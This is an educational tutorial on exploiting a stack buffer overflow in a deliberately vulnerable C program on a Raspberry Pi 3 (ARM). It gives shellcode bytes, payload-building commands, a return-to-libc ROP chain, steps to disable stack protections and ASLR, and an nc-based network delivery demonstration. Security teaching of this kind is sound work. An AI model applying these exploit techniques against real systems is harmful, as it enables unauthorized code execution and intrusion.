# Tutorial: Exploiting Buffer Overflow on ARM (A32) with Raspberry Pi 3

Ben Lynn has written an excellent tutorial about how to exploit a
stack-based buffer overflow vulnerability on 64-bit Linux in his
blog post [Return-oriented programming on 64-bit
Linux](https://crypto.stanford.edu/~blynn/rop/). In this tutorial, we
demonstrate similar techniques on an ARM architecture, using a [Raspberry
Pi 3](https://www.raspberrypi.org/products/raspberry-pi-3-model-b/)
running the Raspbian Linux operating system. 

## Operating system for the tutorial
[Raspian](https://www.raspberrypi.org/downloads/raspbian/) (kernel
version 4.14). Running `uname -a` gives `Linux rpi 4.14.37-v7+ \#1111
SMP Thu Apr 26 13:56:59 BST 2018 armv7l GNU/Linux`

## Disablement of Linux platform countermeasures
For a demonstration purpose, in this tutorial, we shall disable Linux
platform provided anti-exploitation countermeasures: 
### Stack smash protector (SSP, stack canary): disable for Part 1 and Part 2
When building vulnerable code
```
    gcc -fno-stack-protector [other args] badcode.c
```

### Non-executable stack (data execution prevention, DEP): disable for Part 1
Mark binary `badcode` as requiring executable stack. 
```
    execstack -s ./badcode
```

Note: As it [turned
out](https://stackoverflow.com/questions/45253755/why-is-the-stack-segment-executable-on-raspberry-pi/45254318),
the command that is supposed to mark the binary's stack non-executable,
`execstack -c ./badcode`, takes no effect on the version of Raspbian I
use for this demonstration. And therefore, this step is redundant on
this particular platform.

### Adress space layout randomization (ASLR): disable for Part 1 and Part 2
One can either disable ASLR on the vulnerable binary only during
execution time
```
    setarch `arch` -R ./badcode
```
or temporarily disable ASLR on the entire platform
```
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

To make it simple, in this tutorial we will only use the A32
instruction set, and will not take advantage the ARMv7 processor's
support of the Thumb (T32) instruction set.

## Part 1: Exploit a stack-based buffer overflow by returning to shell code

In this section, we demonstrate how to overwrite the vulnerable code's
`main` function's return address to point it to a piece of shell code
stored on the stack.

### The stack layout for this exploit
```
    --- bottom of stack ---
  
    return addr: addr of &buf[0]
    -----------------------
        $r11 (frame pointer)
    -----------------------
    80-byte buf, beginning with shellcode

    ---  top of stack   ---
```
### The shellcode
The shell code uses the `execve` system call to invoke `/bin/sh`.

The shell code can be extracted from the executable 'shell', compiled out of
the source file [shell.c](src/shell.c), by the procedures that follow:

```
    $ cd src
    $ make shell
```

Now the ELF 32-bit LSB executable 'shell' is generated. We use `objdump` to
inspect the shell code of interest.
```
    $ objdump -d shell | sed -n '/needle0/,/needle1/p'
```
This prints
```assembly
,/needle1/p'
000103f0 <needle0>:
   103f0:	ea000004 	b	10408 <lab1>

000103f4 <lab0>:
   103f4:	e1a0000e 	mov	r0, lr
   103f8:	e0211001 	eor	r1, r1, r1
   103fc:	e0222002 	eor	r2, r2, r2
   10400:	e3a0700b 	mov	r7, #11
   10404:	ef000000 	svc	0x00000000

00010408 <lab1>:
   10408:	ebfffff9 	bl	103f4 <lab0>
   1040c:	6e69622f 	.word	0x6e69622f
   10410:	7361622f 	.word	0x7361622f
   10414:	68          	.byte	0x68

00010415 <needle1>:
```

Because '0x415-0x3f0' equals 37 in decimal, we round it to 40 bytes (so
that the code is 4-byte aligned) for the shell code.
```
    $ xxd -s0x415 -l40 -p shell > shellcode
    $ cat shellcode
    040000ea0e00a0e1011021e0022022e00b70a0e3000000eff9ffffeb2f62
    696e2f6261736800dead
```

This is the shell code we are going to jump to after overrunning the stack
buffer later.

## The bad code
The bad C code, [badcode.c](src/badcode.c), exhibits a classic buffer overflow
on the stack. To compile the code without stack protection and DEP, two
OS-added anti-exploitation countermeasures, for the demonstration purpose, do
```
    $ make badcode
```

Now let's get some idea about the stack layout in the 'badcode' program.
```
    $ gdb ./badcode
```

Within the `gdb` console, disassemble the 'main' function
```
(gdb) disas main
Dump of assembler code for function main:
   0x0001047c <+0>:	push	{r11, lr}
   0x00010480 <+4>:	add	r11, sp, #4
   0x00010484 <+8>:	sub	sp, sp, #88	; 0x58
   0x00010488 <+12>:	str	r0, [r11, #-88]	; 0x58
   0x0001048c <+16>:	str	r1, [r11, #-92]	; 0x5c
   0x00010490 <+20>:	sub	r3, r11, #84	; 0x54
   0x00010494 <+24>:	ldr	r0, [pc, #52]	; 0x104d0 <main+84>
   0x00010498 <+28>:	mov	r1, r3
   0x0001049c <+32>:	bl	0x1030c
   0x000104a0 <+36>:	ldr	r0, [pc, #44]	; 0x104d4 <main+88>
   0x000104a4 <+40>:	bl	0x10324
   0x000104a8 <+44>:	sub	r3, r11, #84	; 0x54
   0x000104ac <+48>:	mov	r0, r3
   0x000104b0 <+52>:	bl	0x10318
   0x000104b4 <+56>:	sub	r3, r11, #84	; 0x54
   0x000104b8 <+60>:	mov	r0, r3
   0x000104bc <+64>:	bl	0x10324
   0x000104c0 <+68>:	mov	r3, #0
   0x000104c4 <+72>:	mov	r0, r3
   0x000104c8 <+76>:	sub	sp, r11, #4
   0x000104cc <+80>:	pop	{r11, pc}
   0x000104d0 <+84>:	andeq	r0, r1, r12, asr #10
   0x000104d4 <+88>:	andeq	r0, r1, r0, asr r5
End of assembler dump.
```

From the disassembled code at offset +44, we can tell that the stack
array we are trying to overflow, 'buf', starts 84 (i.e., 0x54 in hex)
bytes below $r11, which points to the location of the saved $lr on the
stack (see code at offset +4). It is the return address of the 'main' 
function. In other words, the saved return address of the 'main'
function on the stack is 84 bytes above 'buf'. This is the address we
will overwrite.

### The Exploit

Our exploitation strategy is therefore as follows:

1. Prepare a payload of 88 bytes in total, with the shell code in front, and
   the 4-byte address of 'buf' in the end. We also preserve the value of
   saved $r11 by setting the second last 4 bytes appropriately. In gdb,
   by breaking at `*0x0001047c` and examining the value of $r11, we
   obtain that this value should be 0x0.
2. Put our payload (and thus shell code) at the address of 'buf', so that the
   return address of 'main' will be overridden with the address of the
   shell code.
3. Fill the rest of the payload with arbitrary bytes.

For the demonstration, we also disable ASLR when running the 'badcode'
program (in the meanwhile 'badcode' also prints out the address of 'buf', to
simplify the demonstration).
```
    $ setarch `arch` -R ./badcode
    0x7efff1f8
    Enter name:
```

To implement the above strategy

1. Get the address of 'buf', 0x7efff1f8, which has been printed out in the
   test run above.
2. Prepare the payload file 'payload'

   ```
   $ pad=$(for i in `seq 40`; do echo -n '42'; done)
   $ r11=$(printf %08x 0x0 | tac -rs..)
   $ ret=$(printf %08x 0x7efff1f8 | tac -rs..) # little endian
   $ (cat shellcode; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > payload
   ```
   If we run `xxd payload`, we will see the payload content as
   follows:
   ```
   0000000: 0400 00ea 0e00 a0e1 0110 21e0 0220 22e0  ..........!.. ".
   0000010: 0b70 a0e3 0000 00ef f9ff ffeb 2f62 696e  .p........../bin
   0000020: 2f62 6173 6800 dead 4242 4242 4242 4242  /bash...BBBBBBBB
   0000030: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
   0000040: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
   0000050: 0000 0000 f8f1 ff7e                      .......~
   ```

3. Run exploit (using `cat` as stdin)

   ```
    $ (cat payload; cat) | setarch `arch` -R ./badcode
    0x7efff1f8
    Enter name:
   ```
   Press 'enter', and now we have the shell

   ```
   date
   Fri May  4 02:05:24 CST 2018
   uname -r
   4.14.37-v7+
   whoami
   pi
   apt-get moo
                    (__) 
                    (oo) 
              /------\/ 
             / |    ||   
            *  /\---/\ 
               ~~   ~~   
   ..."Have you mooed today?"...
   ```

Recall that in the demonstration above, we have turned off Linux provided
countermeasures: stack protection, non-executable stack, and address space
layout randomization.

If non-executable stack is turned on, then the above exploit would not
have worked. Unfortunately, on the version of the Raspbian I use for
this tutorial, non-executable stack is not properly implemented, and
thus cannot be easily enabled using the `execstack -c [binary]` command.
On a target that supports this countermeasure, its effect can be
observed by `make badcode_dep`, and then repeating the procedures above
on `./badcode_dep`. You should receive a segementation fault (core
dumped) message when injecting the payload.

In Part 2, we will describe the technique to bypass non-executable
stack.

### How to demonstrate the attack over the network

* On victim machine, change to the `src` directory. On one terminal
  ```
  $ mkfifo pip
  $ nc -l 3333 > pip # listening on port 3333: DANGER
  ```
  On another terminal
  ```
  $ cat pip | setarch `arch` -R ./badcode
  ```

* On attacking machine, change to the `src` directory. On a terminal
  ```
  $ (cat payload; cat) | nc 127.0.0.1 3333
  ```
  In the above command, `127.0.0.1` can be replaced with the external IP
  of the victim machine.

## Part 2: Return-oriented programming exploit on ARMv7

### The stack layout for this exploit
```
    --- bottom of stack ---

     addr of 'system()'
    -----------------------
     addr of "/bin/sh"
    -----------------------
     addr of 'pop {r0, pc}'
    -----------------------
       saved $r11 (0x000000)
    -----------------------
    80-byte buf, filled with anything

    ---  top of stack   ---
```

### Return on ARM

There is no 'RET' instruction on ARM. However, returning on ARM can be
as simple as putting the address of the instruction to jump to in the
$pc register, e.g., `pop {pc}`. And this is effectively equivalent to a
'RET' on x64, i.e., it jumps to the address in memory held my the stack
pointer $sp, and increments $sp by the size of a pointer length (4 for
A32).

Our exploitation strategy is therefore the following: by laying out the
stack content carefully, and bootstrap the jump to (a chain of)
instructions such as `pop {r0, ..., pc}` to cause the program control
flow to hit `system("/bin/sh")`.

## The procedures 
It might be tempting to put the string "/bin/sh" inside the buffer that
is being overflown. However, because the buffer is on the stack, and
subsequent function invocations (e.g., 'system()') may destroy this
content, doing so will make the exploit unreliable, and often causes a
SIGSEGV before the shell gets to run. A better strategy is to find the
location of the string "/bin/bash" in other parts of the program's
memory space, for example, in 'libc'. In gdb, we do
```
(gdb) b main
Breakpoint 1 at 0x10490: file badcode.c, line 7.
(gdb) run
Starting program: /home/pi/src/rop-tutorial-on-arm32/src/badcode_dep 

Breakpoint 1, main (argc=1, argv=0x7efff354) at badcode.c:7
7	    printf("%p\n", buf); // address of the buf array
(gdb) print &system
$1 = (<text variable, no debug info> *) 0x76e9ffac <__libc_system>
(gdb) find &system,+9999999,"/bin/sh"
0x76f83b20
warning: Unable to access 16000 bytes of target memory at 0x76f93528, halting search.
1 pattern found.
(gdb) x/s 0x76f83b20
0x76f83b20:	"/bin/sh"
```

This way, we find the memory address 0x76f83b20, at which the string
"/bin/sh" resides. Save the hexadecimal representation of this address
to a variable $r0:
```
$ r0=$(printf %08x 0x76f83b20 | tac -rs..)
```

Next, we search for a ROP gadget of the form 'pop {r0, ..., pc}' in shared
libraries loaded by the vulnerable program. For example, searching in
'libc'
```
$ objdump -d /lib/arm-linux-gnueabihf/libc-2.19.so | grep -B5 "pop.*r0.*pc"
```
we get a number of reasonable choices such as 'pop     {r0, r4, pc}', as
shown below
```
   7a118:	25714001 	ldrbcs	r4, [r1, #-1]!
   7a11c:	2551c001 	ldrbcs	ip, [r1, #-1]
   7a120:	15603001 	strbne	r3, [r0, #-1]!
   7a124:	25604001 	strbcs	r4, [r0, #-1]!
   7a128:	2540c001 	strbcs	ip, [r0, #-1]
   7a12c:	e8bd8011 	pop	{r0, r4, pc}
--
   7aaa4:	24d14001 	ldrbcs	r4, [r1], #1
   7aaa8:	25d1c000 	ldrbcs	ip, [r1]
   7aaac:	14c03001 	strbne	r3, [r0], #1
   7aab0:	24c04001 	strbcs	r4, [r0], #1
   7aab4:	25c0c000 	strbcs	ip, [r0]
   7aab8:	e8bd8011 	pop	{r0, r4, pc}
--
   d4500:	e92d480f 	push	{r0, r1, r2, r3, fp, lr}
   d4504:	e1b0000b 	movs	r0, fp
   d4508:	15100004 	ldrne	r0, [r0, #-4]
   d450c:	11b0100e 	movsne	r1, lr
   d4510:	1bfffd1b 	blne	d3984 <_mcleanup+0x40>
   d4514:	e8bd880f 	pop	{r0, r1, r2, r3, fp, pc}
```

It turns out, a more straightforward gadget 'pop {r0, pc}' is readily
available in 'libarmmem.so'
```
$ objdump -d /usr/lib/arm-linux-gnueabihf/libarmmem.so | grep -B5 "pop.*r0.*pc"
```
An example output is
```
    40ec:	28a0000a 	stmiacs	r0!, {r1, r3}
    40f0:	44801004 	strmi	r1, [r0], #4
    40f4:	e1b02102 	lsls	r2, r2, #2
    40f8:	20c010b2 	strhcs	r1, [r0], #2
    40fc:	45c01000 	strbmi	r1, [r0]
    4100:	e8bd8001 	pop	{r0, pc}
```
We now know at the instruction 'pop     {r0, pc}' is at offset 0x4100 in
'libarmmem.so'. And this is the gadget we are going to use for our ROP
exploit. To find out the address of this gadget, we just need to know
the start address of 'libarmmem.so' in the program's address space. It
can be done by running `./badcode_dep` in one terminal, and in another
```
$ pid=$(ps -C badcode_dep -o pid --no-header)
$ grep libarmmem /proc/$pid/maps
```
to get the start address 0x76fba00, as shown in the output below
```
76fba000-76fbf000 r-xp 00000000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
76fbf000-76fce000 ---p 00005000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
76fce000-76fcf000 rw-p 00004000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
```
Adding the offset 0x4100 to it, we have
```
$ ret=$(printf %08x $((0x76fba000+0x4100)) | tac -rs..)
```

Similarly, we obtain the address of the 'system()' function by first
finding its offset (0x39fac) in 'libc'
```
$ nm -D /lib/arm-linux-gnueabihf/libc-2.19.so | grep '\<system\>'
00039fac W system
```
and then getting the start address of 'libc' (0x76e66000) in memory
```
$ grep libc /proc/$pid/maps     
76e66000-76f91000 r-xp 00000000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
76f91000-76fa1000 ---p 0012b000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
76fa1000-76fa3000 r--p 0012b000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
76fa3000-76fa4000 rw-p 0012d000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
```

Adding the offset to the start address, we have
```
$ system_addr=$(printf %08x $((0x76e66000+0x39fac)) | tac -rs..)
```

We set up the first 84 bytes as 80-byte arbitrary data followed by the
saved $r11 value 0x00000000.
```
$ pad=$(echo -n "ARM ROP Tutorial" | xxd -p; \
echo -n "00"; \
for i in `seq 63`; do echo -n "42"; done; \
echo -n "00000000")
```

Now we complete the construction of the 96-byte ROP payload
```
$ echo -n ${pad}${ret}${r0}${system_addr} | xxd -r -p > rop_payload
```

Run the ROP exploit
```
$ (cat rop_payload ; cat) | ./badcode_dep 
```

Hit a few enters to get in the spawned shell.
```
Enter name:

ARM ROP Tutorial
whoami
pi
date
Fri  4 May 04:53:42 CST 2018
exit
```

Note that when we exit from the shell, it might get an (unharmful)
segmentation fault. This is likely caused by the arbitrary bytes we used
for the padding or our setting the saved $r11 as 0x00000000. I have not
digged into the root cause, but it should not affect the effectiveness
of our exploit.

## A list of unsafe C functions to avoid when playing with strings
```
gets
strcpy
strcat
sprintf
scanf
sscanf
```
Use `memcpy` with extra care.







